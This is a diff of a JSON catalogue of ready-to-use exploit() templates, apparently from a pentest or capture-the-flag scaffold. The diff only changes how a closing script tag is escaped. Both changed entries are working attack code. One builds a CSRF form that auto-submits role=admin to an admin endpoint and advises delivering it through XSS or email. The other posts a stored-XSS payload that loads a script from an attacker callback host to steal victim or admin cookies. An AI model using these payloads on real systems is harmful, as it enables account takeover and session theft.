@@ -450,7 +450,7 @@
             "slot": "replaces exploit()",
             "summary": "Hosts or submits a CSRF auto-post payload for state-changing endpoints without CSRF protection.",
             "filename": "replace_exploit_csrf_state_change.py",
-            "code": "CSRF_PATH = \"/admin/update\"          # EDIT\nCSRF_FIELDS = {\"role\": \"admin\"}      # EDIT\n\ndef build_csrf_html():\n    inputs = \"\\n\".join(f'<input type=\"hidden\" name=\"{k}\" value=\"{v}\">' for k, v in CSRF_FIELDS.items())\n    return f\"\"\"\n<form id=\"f\" method=\"POST\" action=\"{TARGET}{CSRF_PATH}\">\n{inputs}\n</form>\n<script>document.getElementById('f').submit()</script>\n\"\"\"\n\ndef exploit():\n    print(build_csrf_html())\n    print(\"[+] deliver this HTML through XSS, upload, email template, or callback response\")\n"
+            "code": "CSRF_PATH = \"/admin/update\"          # EDIT\nCSRF_FIELDS = {\"role\": \"admin\"}      # EDIT\n\ndef build_csrf_html():\n    inputs = \"\\n\".join(f'<input type=\"hidden\" name=\"{k}\" value=\"{v}\">' for k, v in CSRF_FIELDS.items())\n    return f\"\"\"\n<form id=\"f\" method=\"POST\" action=\"{TARGET}{CSRF_PATH}\">\n{inputs}\n</form>\n<script>document.getElementById('f').submit()<\\/script>\n\"\"\"\n\ndef exploit():\n    print(build_csrf_html())\n    print(\"[+] deliver this HTML through XSS, upload, email template, or callback response\")\n"
       },
       {
             "id": "exploit-deserialization-rce",
@@ -680,7 +680,7 @@
             "slot": "replaces exploit()",
             "summary": "Posts a stored XSS payload that loads the attacker JS/cookie callback and waits for the listener.",
             "filename": "replace_exploit_stored_xss_cookie_steal.py",
-            "code": "POST_PATH = \"/comment\"               # EDIT\nTEXT_FIELD = \"text\"                  # EDIT\n\ndef exploit():\n    payload = f'<script src=\"http://{CALLBACK_HOST}:{CALLBACK_PORT}/payload.js\"></script>'\n    r = s.post(f\"{TARGET}{POST_PATH}\", data={TEXT_FIELD: payload}, timeout=TIMEOUT)\n    r.raise_for_status()\n    print(\"[+] stored XSS submitted; wait for victim/admin callback\")\n"
+            "code": "POST_PATH = \"/comment\"               # EDIT\nTEXT_FIELD = \"text\"                  # EDIT\n\ndef exploit():\n    payload = f'<script src=\"http://{CALLBACK_HOST}:{CALLBACK_PORT}/payload.js\"><\\/script>'\n    r = s.post(f\"{TARGET}{POST_PATH}\", data={TEXT_FIELD: payload}, timeout=TIMEOUT)\n    r.raise_for_status()\n    print(\"[+] stored XSS submitted; wait for victim/admin callback\")\n"
       },
       {
             "id": "exploit-time-sqli-bitwise",
